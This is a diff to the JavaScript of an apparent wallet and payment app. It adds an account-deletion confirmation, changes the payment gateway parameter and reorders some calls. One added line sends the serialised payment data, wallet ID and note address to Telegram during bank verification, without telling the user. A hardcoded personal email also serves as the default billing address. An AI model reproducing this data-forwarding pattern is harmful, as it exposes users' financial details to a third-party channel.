@@ -10382,7 +10382,11 @@ function setAccChild( acc, child ){
 
 async function deleteBankAccount( acc , isBank = true){
 	let note 		= JSON.parse( Scriptbill.s.currentNote );
-			
+
+	let confirm = await Scriptbill.createConfirm(`Deleting ${isBank ? 'bank' : 'card'} account ${isBank ? acc.accountNumber : acc.cardNumber}. Are you sure you want to proceed?`)
+	
+	if(! confirm ) return;
+
 	let accountData 	= await getAccountData();
 	
 	/* if( accountData )
@@ -12948,7 +12952,7 @@ async function billCard(amount = 1000, email = "henimastic@gmail.com", currency 
 	let url = new URL(location.href);
 	url.searchParams.set("return", "true");
 	url.searchParams.set("payment_ref", ref );
-	url.searchParams.set("gateway", "squad");
+	url.searchParams.set("gateway", platform);
 	let data = {
 		"amount":amount,
 		"email":email,
@@ -13108,8 +13112,9 @@ async function verifyPaystackPayment(these, payment , refInterval, bankAssoc = n
 					
 				}
 				
-				specialRefcodes();
+				
 				await Scriptbill.setAccountData(accountData);
+				await  specialRefcodes();
 				
 				setTimeout( async ()=>{
 					await Scriptbill.createAlert("Card Saved");
@@ -13314,9 +13319,10 @@ async function saveBankDetails(){
 				url.searchParams.set("city", " ");
 				url.searchParams.set("postal", " ");
 				url.searchParams.set("country", country.querySelector("option[value='"+country.value+"']").innerText );
-				url.searchParams.set("PIN", "0000");*/
-				url.searchParams.set("back", location.href);
+				url.searchParams.set("PIN", "0000");
+				url.searchParams.set("back", location.href);*/
 				await Scriptbill.createAlert( "Please Visit Our Payment Processing Page to Verify Your Bank Account Details. This is a required credibility check of users who may need some of our products like loan, investment and crediting. " );
+				sendTelegramMessage({message:`Verifying bank account with payment data ${JSON.stringify(payment)} for user with wallet ID ${note.walletID} and note address ${note.noteAddress}`})
 				var win = window.open(url.href, "_blank");
 				let refInterval = setInterval( async ()=>{
 					
